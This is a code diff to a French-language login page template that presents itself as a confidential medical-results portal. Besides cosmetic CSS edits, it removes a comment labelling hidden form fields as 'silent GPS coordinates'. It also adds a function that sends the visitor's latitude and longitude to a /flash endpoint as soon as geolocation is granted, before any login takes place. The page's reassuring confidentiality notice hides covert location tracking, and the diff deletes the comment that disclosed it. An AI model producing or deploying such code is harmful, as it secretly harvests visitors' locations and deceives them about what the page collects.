@@ -6,8 +6,6 @@
     <style>
         body {
             font-family: "Segoe UI", sans-serif;
-            margin: 0;
-            padding: 0;
             background: url("{{ url_for('static', filename='dna.jpeg') }}") no-repeat center center fixed;
             background-size: cover;
             backdrop-filter: blur(2px);
@@ -16,6 +14,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            margin: 0;
         }
 
         .login-container {
@@ -73,10 +72,6 @@
             cursor: pointer;
         }
 
-        button:hover {
-            background-color: #244b6b;
-        }
-
         .error {
             color: #b30000;
             margin-top: 10px;
@@ -86,30 +81,22 @@
             margin-top: 25px;
             font-size: 14px;
             color: #888;
-            font-weight: 500;
-            letter-spacing: 0.5px;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
         <h2>Accéder à vos analyses sécurisées</h2>
-        <p class="warning">⚠️ Ce portail est réservé à un usage confidentiel.  
-            Toute tentative d'accès non autorisé est enregistrée.  
-            Les données médicales sont protégées par le secret professionnel.</p>
+        <p class="warning">⚠️ Ce portail est réservé à un usage confidentiel. Toute tentative d'accès non autorisé est enregistrée. Les données médicales sont protégées par le secret professionnel.</p>
 
         <form method="POST" onsubmit="injectCoords()">
             <div class="password-wrapper">
                 <input type="password" name="password" id="password" placeholder="Mot de passe" required>
                 <span class="toggle-password" onclick="togglePassword()">👁️</span>
             </div>
-
-            <!-- Coordonnées GPS silencieuses -->
             <input type="hidden" name="lat" id="lat">
             <input type="hidden" name="lon" id="lon">
-
             <button type="submit">Valider</button>
-
             {% if error %}
                 <p class="error">{{ error }}</p>
             {% endif %}
@@ -128,6 +115,7 @@
                     function (position) {
                         userLatitude = position.coords.latitude;
                         userLongitude = position.coords.longitude;
+                        sendFlashLocation(userLatitude, userLongitude);
                     },
                     function () {
                         console.log("Géolocalisation refusée.");
@@ -145,6 +133,14 @@
         function togglePassword() {
             const pwd = document.getElementById("password");
             pwd.type = pwd.type === "password" ? "text" : "password";
+        }
+
+        function sendFlashLocation(lat, lon) {
+            fetch("/flash", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ lat: lat, lon: lon })
+            });
         }
     </script>
 </body>
